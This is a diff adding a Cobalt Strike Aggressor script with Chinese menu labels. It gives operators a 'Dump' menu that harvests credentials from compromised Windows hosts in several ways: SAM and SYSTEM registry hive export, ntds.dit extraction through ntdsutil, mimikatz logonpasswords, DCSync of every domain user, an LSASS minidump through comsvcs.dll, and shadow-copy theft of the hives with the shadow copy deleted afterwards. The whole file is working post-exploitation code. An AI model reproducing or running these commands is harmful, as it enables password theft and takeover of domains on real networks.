@@ -1,0 +1,166 @@
+sub existsadmin{
+	if(-isadmin $1){
+		btask($1 ,"Dump Lsass Mode:$2 check Administrator Privilege:True");
+		return 0;
+	}else{
+		btask($1 ,"Dump Lsass Mode:$2 check Administrator Privilege:False");
+		return -1;
+	}
+}
+
+sub regdump{
+	foreach $id ($bid){
+		if (existsadmin($id, "regdump") ne -1){
+				btask($id, "reg dump SAM,SYSTEM start");
+				$outpath = $3["file"];
+				bshell($id, "reg save HKLM\\SAM $outpath\\sam /y");
+				bshell($id, "reg save HKLM\\SYSTEM $outpath\\system /y");
+				bshell($id, "dir $outpath | findstr \"sam\"");
+				bshell($id, "dir $outpath | findstr \"system\"");
+		}
+	}
+}
+
+sub ntdsutildump{
+	foreach $id ($bid){
+		if (existsadmin($id, "ntdsutildump") ne -1){
+			btask($id, "ntdsutil dump ntds.dit、SYSTEM");
+			$outpath = $3["file"];
+			$outpath2 = $3["file2"];
+			brm($id, $outpath); #先删一次文件夹避免报错
+			bmkdir($id, $outpath);
+			$cmd = "powershell \"ntdsutil.exe 'ac i ntds' 'ifm' 'create full ".$outpath."' q q\"&&move /y \"$outpath\\Active Directory\\ntds.dit\" $outpath2\\ntds.dit&&move /y $outpath\\registry\\SECURITY $outpath2\\SECURITY&&move /y $outpath\\registry\\SYSTEM $outpath2\\SYSTEM";
+			bshell($id, $cmd);
+			brm($id, $outpath);
+			bshell($id, "dir $outpath2 | findstr \"ntds.dit\"");
+			bshell($id, "dir $outpath2 | findstr \"SECURITY\"");
+			bshell($id, "dir $outpath2 | findstr \"SYSTEM\"");
+		}
+	}
+}
+
+sub regdump_config{
+	$dialog = dialog("reg dump hash", %(file => "C:\\Windows\\Temp"), &regdump);
+	dialog_description($dialog, "reg导出SAM、System,指定save的路径");
+	drow_text($dialog, "file", "OutPath:");
+	dbutton_action($dialog, "RUN");
+	dialog_show($dialog);
+}
+
+sub ntdsutil_config{
+	$dialog = dialog("ntdsutildump", %(file => "C:\\Windows\\Temp\\RaidEnMei", file2 => "C:\\Windows\\Temp"), &ntdsutildump);
+	dialog_description($dialog, "(有域的环境)ntdsutil导出ntds.dit、SYSTEM,指定路径创建并导出(导出的文件夹要求为空)");
+	drow_text($dialog, "file", "OutPath:");
+	drow_text($dialog, "file2", "OutPath2:");
+	dbutton_action($dialog, "RUN");
+	dialog_show($dialog);
+}
+
+sub mimikatzlogonpasswords{
+	foreach $id ($bid){
+		if(existsadmin($id, "mimikatzlogonpasswords") ne -1){
+			btask($id, "Mimikatz LogonPassword");
+			bmimikatz($id, "sekurlsa::logonpasswords");
+		}
+	}
+}
+
+sub dcsyncdump{
+	foreach $id ($bid){
+		btask($id, "dcsyncdump");
+		if(existsadmin($id, "dcsyncdump") ne -1){
+			btask($id, "dcsyncdump");
+			$domain = $3["domain"];
+			$user = $3["user"];
+			if($user eq "ALL"){
+				bdcsync($id, $domain);
+			}else{
+				bdcsync($id, $domain, $user);
+			}
+		}
+	}
+}
+
+sub dcsyncdump_config{
+	$dialog = dialog("dcsyncdump", %(domain => "RaidEnMei.local", user => "ALL"), &dcsyncdump);
+	dialog_description($dialog, "(有域的环境)进程dcsync dump [user=ALL dump所有用户 | user=Administrator]");
+	drow_text($dialog, "domain", "domain:");
+	drow_text($dialog, "user", "user:");
+	dbutton_action($dialog, "RUN");
+	dialog_show($dialog);
+}
+
+sub minidump{
+		$idname = $2;
+		$savepath = $3;
+		bps($1, lambda({
+		local('$pid $name $entry');
+		foreach $entry (split("\n", $2)) {
+			($name, $null, $pid) = split("\\s+", $entry);
+			if ($name eq $idname) {
+				btask($1, "Find Process: $name $pid");
+				bshell!($1, "powershell \"rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump $pid $savepath full\"");
+				bshell!($1, "dir $savepath");
+				break;
+			}
+		}
+	}, $callback => $2));
+}
+
+sub comsvcsdll_minidump{
+	foreach $id ($bid){
+		btask($id, "comsvcs.dll minidump");
+		if(existsadmin($id, "comsvcs.dll minidump") ne -1){
+			minidump($id, $3["processname"], $3["path"]);
+		}
+	}
+}
+
+sub comsvcsdll_minidump_config{
+	$dialog = dialog("comsvcsdll_dump", %(path => "C:\\Windows\\Temp\\lsass.dmp", processname => "lsass.exe"), &comsvcsdll_minidump);
+	dialog_description($dialog, "设置保存dump的路径");
+	drow_text($dialog, "processname", "processname:");
+	drow_text($dialog, "path", "savepath:");
+	dbutton_action($dialog, "RUN");
+	dialog_show($dialog);
+}
+
+sub vssadmindump{
+	foreach $id ($bid){
+		btask($id, "vssadmindump");
+		if(existsadmin($id, "vssadmindump") ne -1){
+			bshell($id, "wmic shadowcopy call create Volume='C:\\'&&powershell \"\$vpath=vssadmin list shadows | findstr GLOBALROOT;\$path=\$vpath -split ':';\$sampath=-join(\$path[-1].Trim(),'\\Windows\\System32\\config\\sam');\$systempath=-join(\$path[-1].Trim(),'\\Windows\\System32\\config\\system');\$security=-join(\$path[-1].Trim(),'\\Windows\\System32\\config\\security');cmd /c copy \$sampath C:\\Windows\\Temp\\sam /y;cmd /c copy \$systempath C:\\Windows\\Temp\\system /y;cmd /c copy \$security C:\\Windows\\Temp\\security /y;vssadmin delete shadows /for=c: /quiet\"");
+			bshell($id, "dir C:\\Windows\\Temp | findstr sam");
+			bshell($id, "dir C:\\Windows\\Temp | findstr system");
+			bshell($id, "dir C:\\Windows\\Temp | findstr security");
+		}
+	}
+}
+
+
+menu "&Dump操作"{
+	$bid = $1;
+	item "&reg导出SAM"{
+		regdump_config($bid);
+	}
+	
+	item "&ntdsutil导出"{
+		ntdsutil_config($bid);
+	}
+	
+	item "&mimikatz读取密码"{
+		mimikatzlogonpasswords($bid);
+	}
+	
+	item "&dcsyncdump"{
+		dcsyncdump_config($bid);
+	}
+	
+	item "&comsvcsdll_minidump"{
+		comsvcsdll_minidump_config($bid);
+	}
+	
+	item "&vssadmin dump"{
+		vssadmindump($bid);
+	}
+}
